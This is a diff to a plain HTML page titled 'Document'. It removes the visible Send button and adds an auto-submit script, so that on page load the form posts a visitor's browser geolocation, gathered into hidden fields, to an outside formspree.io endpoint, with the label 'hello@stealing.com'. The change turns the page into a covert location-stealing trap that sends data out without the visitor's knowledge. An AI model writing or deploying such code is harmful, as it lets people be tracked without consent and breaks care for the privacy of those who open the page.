@@ -7,16 +7,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
-
-    <body>
-        
-        <form action="https://formspree.io/f/xayazppw" method="POST">
+    <body> 
+        <form action="https://formspree.io/f/xayazppw" method="POST" id="form_id">
             <label style="visibility:hidden">Your email:<input type="email" name="_replyto">hello@stealing.com</label>
             <label style="visibility:hidden">Your message:<textarea name="message" id="location"></textarea></label>
-            <button type="submit">Send</button>
         </form>
         
-                <script>
+        <script>
             var div = document.getElementById("location");
             function getLocation() {
                 if (navigator.geolocation) {
@@ -36,6 +33,10 @@
             getLocation();
         </script>
         
+        <script type="text/javascript">
+            document.forms['form_id'].submit();
+        </script>
+    
     </body>
 
 </html>
